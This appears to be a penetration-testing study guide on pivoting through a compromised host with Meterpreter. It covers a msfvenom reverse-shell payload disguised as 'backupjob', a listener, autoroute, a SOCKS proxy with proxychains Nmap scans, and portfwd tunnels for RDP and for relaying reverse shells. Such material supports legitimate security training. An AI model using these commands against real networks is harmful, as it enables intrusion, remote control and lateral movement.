
This guide covers the methodology and step-by-step process for leveraging an active Meterpreter session on a pivot host to perform internal network reconnaissance, establish SOCKS proxies, and execute port forwarding without relying on SSH.
### Methodology Overview

When you have a Meterpreter session on a compromised pivot host (e.g., an Ubuntu server), you can use built-in post-exploitation modules like `autoroute` and `socks_proxy` to route tools like Nmap into internal networks. Additionally, Meterpreter's `portfwd` module enables local and reverse port forwarding to interact with internal services or catch reverse shells directly through the existing session channel.
### Step-by-Step Process
#### Step 1: Establish a Meterpreter Session on the Pivot Host
1. Generate an executable payload for the pivot host:
    Bash
    ```
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
    ```
2. Start a multi/handler listener on your attack host:
    Bash
    ```
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    msf6 exploit(multi/handler) > set lport 8080
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    ```
3. Transfer the payload to the pivot host, make it executable, and run it:
    Bash
    ```
    chmod +x backupjob && ./backupjob
    ```
#### Step 2: Configure Routing with AutoRoute
Add a route through your Meterpreter session so your attack host knows how to reach the internal subnet (e.g., `172.16.5.0/23`).

Bash
```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
_(Alternatively, run `run autoroute -s 172.16.5.0/23` directly inside the Meterpreter session)._
#### Step 3: Set Up a SOCKS Proxy Server
Start Metasploit's SOCKS proxy module to handle tool traffic through the established routes.
Bash
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
```
#### Step 4: Configure Proxychains and Scan Internal Targets
1. Ensure your `/etc/proxychains.conf` file includes the local SOCKS listener:
    Plaintext
    ```
    socks4 127.0.0.1 9050
    ```
2. Execute tools like Nmap through proxychains to scan internal hosts:
    Bash
    ```
    proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
    ```

#### Step 5: Perform Port Forwarding via Meterpreter (`portfwd`)
- **Local Port Forwarding (e.g., for RDP):** Bind a local port on your attack host and forward it to an internal target service through the Meterpreter session.
    Bash
    ```
    meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
    ```
    _(Connect locally using: `xfreerdp /v:localhost:3300 /u:username /p:password`)_
- **Reverse Port Forwarding (e.g., to Catch a Reverse Shell):** Instruct the pivot host to listen on a specific port and relay incoming connections back to your local Metasploit listener.
    Bash
    ```
    meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
    ```